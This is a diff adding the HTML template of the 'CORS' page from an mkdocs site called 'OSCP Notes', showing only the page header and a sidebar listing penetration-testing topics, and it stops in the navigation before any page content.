@@ -1,0 +1,2380 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://an4kein.github.io/oscp-notes/enumeration/web_attacks/cors/">
+      
+      
+        <link rel="prev" href="../cookie-padding/">
+      
+      
+        <link rel="next" href="../crawl-fuzz/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>CORS - OSCP Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cors" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="OSCP Notes" class="md-header__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OSCP Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              CORS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../files/" class="md-tabs__link">
+          
+  
+    
+  
+  Enumeration
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../exploitation/payloads/" class="md-tabs__link">
+          
+  
+    
+  
+  Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../post_exploitation/linux/" class="md-tabs__link">
+          
+  
+    
+  
+  Post Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../oscp_tips/" class="md-tabs__link">
+        
+  
+    
+  
+  OSCP Tips
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="OSCP Notes" class="md-nav__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    OSCP Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../files/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ssl_tls/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSL/TLS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ports/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ports
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Web Attacks
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Web Attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../general-info/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General Info
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quick-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Quick Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../broken-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broken Links
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../parameter-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Parameter Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bruteforcing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforcing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pastejacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pastejacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clickjacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../prototype-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Prototype Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../command-injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cookie-padding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cookie Padding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS PoC
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-poc-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS PoC 2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-poc-3-sensitive-data-leakage" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS PoC 3 - Sensitive Data Leakage
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-json-poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      CORS JSON PoC
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crawl-fuzz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Crawl & Fuzz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crlf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRLF Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSP (Content Security Policy)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF (Cross-Site Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deserialization Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dns-rebinding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS Rebinding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../email-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../header-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Header Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR (Insecure Direct Object References)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi-rfi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LFI & RFI (Local & Remote File Inclusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../online-hashes-cracked/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Online Hashes Cracked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirect
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../request-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Request Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../session-fixation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Session Fixation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection (SQLi)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF (Server-Side Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI (Server-Side Template Injection)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tabnabbing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tabnabbing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upload-bypasses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Bypasses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vhosts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Virtual Hosts Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-deception/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Deception
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-poisoning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Poisoning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-sockets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Sockets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XSS (Cross-Site Scripting)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE (XML External Entity)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/reverse_shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverse Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Code Execution
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            Code Execution
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
